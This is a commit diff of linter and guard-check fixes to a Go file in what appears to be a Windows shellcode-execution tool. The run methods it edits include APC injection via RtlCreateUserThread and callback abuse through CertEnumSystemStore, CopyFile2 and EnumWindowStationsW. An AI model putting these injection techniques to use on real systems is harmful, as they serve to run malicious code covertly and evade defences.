Updated deps/gomk and fixed linter warnings

+++ runmethod_windows.go
@@ -37,10 +37,12 @@ var runMethods map[RunMethod]rFunc = map[RunMethod]rFunc{
 }
 
 func runApc(
-	s *state, f func(windows.Handle, uintptr) error,
+	s *state,
+	f func(windows.Handle, uintptr) error,
 ) (*state, error) {
 	var e error
 
+	//nolint:godox // Not sure how to fix this right now
 	// FIXME why?
 	s.thread, e = w32.RtlCreateUserThread(s.proc, 0, s.l.suspend)
 	if e != nil {
@@ -63,7 +65,14 @@ func runApcThreadEx(s *state) (*state, error) {
 }
 
 func runCertPhysical(s *state) (*state, error) {
-	var e error = w32.CertEnumPhysicalStore(
+	var e error
+
+	if s.l.suspend {
+		e = errors.New("cannot suspend with CertEnumPhysicalStore")
+		return nil, e
+	}
+
+	e = w32.CertEnumPhysicalStore(
 		"My",
 		w32.Wincrypt.CertSystemStoreCurrentUser,
 		0,
@@ -77,7 +86,14 @@ func runCertPhysical(s *state) (*state, error) {
 }
 
 func runCertSystem(s *state) (*state, error) {
-	var e error = w32.CertEnumSystemStore(
+	var e error
+
+	if s.l.suspend {
+		e = errors.New("cannot suspend with CertEnumSystemStore")
+		return nil, e
+	}
+
+	e = w32.CertEnumSystemStore(
 		w32.Wincrypt.CertSystemStoreCurrentService,
 		0,
 		0,
@@ -100,8 +116,12 @@ func runCopy(s *state) (*state, error) {
 		return nil, e
 	}
 
-	os.Remove(filepath.Join(tmp, "notfound.src"))
-	os.Remove(filepath.Join(tmp, "notfound.dst"))
+	if s.l.suspend {
+		return nil, errors.New("cannot suspend with CopyFile2")
+	}
+
+	_ = os.Remove(filepath.Join(tmp, "notfound.src"))
+	_ = os.Remove(filepath.Join(tmp, "notfound.dst"))
 
 	e = w32.CopyFile2(
 		filepath.Join(tmp, "notfound.src"),
@@ -130,7 +150,20 @@ func runCreateThreadEx(s *state) (*state, error) {
 }
 
 func runEnumWS(s *state) (*state, error) {
-	if e := w32.EnumWindowStationsW(s.addr, 0); e != nil {
+	var e error
+
+	if s.l.pid != 0 {
+		return nil, errors.New(
+			"cannot run via EnumWindowStationsW in remote process",
+		)
+	}
+
+	if s.l.suspend {
+		e = errors.New("cannot suspend with EnumWindowStationsW")
+		return nil, e
+	}
+
+	if e = w32.EnumWindowStationsW(s.addr, 0); e != nil {
 		return nil, errors.Newf("failed to execute shellcode: %w", e)
 	}
